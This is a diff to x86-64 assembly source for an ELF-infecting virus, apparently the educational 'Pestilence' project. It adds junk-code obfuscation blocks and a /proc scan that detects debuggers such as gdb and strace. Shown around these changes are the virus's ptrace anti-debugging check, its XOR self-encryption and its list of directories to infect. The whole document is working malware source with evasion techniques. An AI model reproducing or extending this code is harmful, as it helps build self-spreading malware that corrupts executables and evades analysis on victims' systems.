@@ -32,6 +32,14 @@ _start:
 		mov rsi, ENCRYPTION_SIZE
 		mov rdx, [rel encryptionKey]
 
+; JUNK CODE
+mov rcx, PAGE_SIZE
+push rax
+xchg rax, rcx
+add rcx, 0x45
+pop rax
+; END JUNK CODE
+
 		cmp rdx, 0
 		je .antiDebugMeasures
 		call rotativeXOR
@@ -42,8 +50,16 @@ _start:
 		mov rax, SYSCALL_PTRACE
 		xor rdi, rdi
 		syscall
+
 		cmp rax, -1
 		je noDebugAllowed
+
+; JUNK CODE
+mov rdi, rax
+add rdi, rdx
+cmp rdi, 0x256
+jge die
+; END JUNK CODE
 
 		call findDaemonProcess
 		cmp rax, 0
@@ -106,6 +122,13 @@ add rsp, 8
 
 		; Increment offset to next entry in array
 		add r10, rdx
+
+; JUNK CODE
+cmp edx, dword [rdi + 0x3]
+sub rdx, r10
+mov rsi, rdx
+xchg rsi, rdx
+; END JUNK CODE
 
 		; Check if entry is regular file
 		cmp al, DT_REG
@@ -250,6 +273,12 @@ add rsp, 8
 		; Save mapping in pestilence struct
 		mov VALUE(s_pestilence.file_data), rax
 
+; JUNK CODE
+xchg rsi, rdx
+cmp rsi, VALUE(s_pestilence.file_data)
+je .return
+; END JUNK CODE
+
 		; Check if file is EL64
 		mov rdi, rax
 		call isElf64
@@ -296,6 +325,12 @@ isElf64:
 		mov rdx, ELF_GNU
 		cmp qword [rdi], rdx
 		jnz .return
+
+; JUNK CODE
+mov rdx, 0x678235
+cmp qword [rdi], rdx
+je .setTrue
+; END JUNK CODE
 
 .checkELF64_DYN_EXEC:
 		mov rdx, ELF64_AND_DYN
@@ -367,6 +402,12 @@ add rsp, 8
 
 		cmp rax, MMAP_ERROR
 		jae .return
+
+; JUNK CODE
+mov r8, rax
+sub r8, 0x200
+xchg rdx, r8
+; END JUNK CODE
 
 		mov VALUE(s_pestilence.file_data), rax
 		mov r8, rax
@@ -504,6 +545,12 @@ isDaemon:
 		lea rsi, [rel processDirectory]
 		lea rdi, VALUE(s_pestilence.file_path)
 
+; JUNK CODE
+lea r8, [rdi]
+cmp rsi, [r8]
+je .getFilePath
+; END JUNK CODE
+
 .copyDirname:
 		movsb
 		cmp byte [rsi], 0
@@ -547,19 +594,29 @@ add rsp, 8
 		mov rdi, rax
 		mov rax, SYSCALL_READ
 		lea rsi, VALUE(s_pestilence.file_path)
-		mov rdx, DAEMON_NAME_SIZE
+		mov rdx, 32
 		syscall
 
 		lea rdi, [rel daemonName]
 
-; Compare name of process
+; Check if current process is forbidden
+; RDI => Forbidden process
 .isForbidden:
 		mov r9, rdi
+
+		; Get forbidden process length
+		call ft_strlen
+		mov rcx, rax
+
+		; Check if forbidden process name is in buffer
 		lea rdi, VALUE(s_pestilence.file_path)
-		mov rsi, DAEMON_NAME_SIZE
+		mov rsi, 32
 		mov rdx, r9
-		mov rcx, DAEMON_NAME_SIZE
+		; RCX => length of process name
 		call ft_memmem
+
+		cmp rax, 0
+		jnz .close
 
 .nextForbidden:
 		mov al, 0
@@ -725,11 +782,27 @@ ft_memmem:
 		pop r8
 		ret
 
+
+; * * * * * * * * * * * * * * * * *
+; Return length of C-like string  *
+; RDI => string                   *
+; * * * * * * * * * * * * * * * * *
+ft_strlen:
+		xor     rax, rax
+.loop:
+		cmp     byte [rdi + rax], 0
+		jz      .return
+		inc     rax
+		jmp     .loop
+.return:
+		ret
+
+
 ; This data will be encrypted so we can't read it
 infectDirectories: db "/tmp/test/", 0, "/tmp/test2/", 0, 0
 processDirectory: db "/proc/", 0
 processStatFile: db "/comm", 0
-daemonName: db "daemon", 0, "gdb", 0, "strace", 0, 0
+daemonName: db "daemon\n", 0, "gdb\n", 0, "strace\n", 0, 0
 debugMessage: db "DEBUGGING", 0
 
 ; Encryption ends here
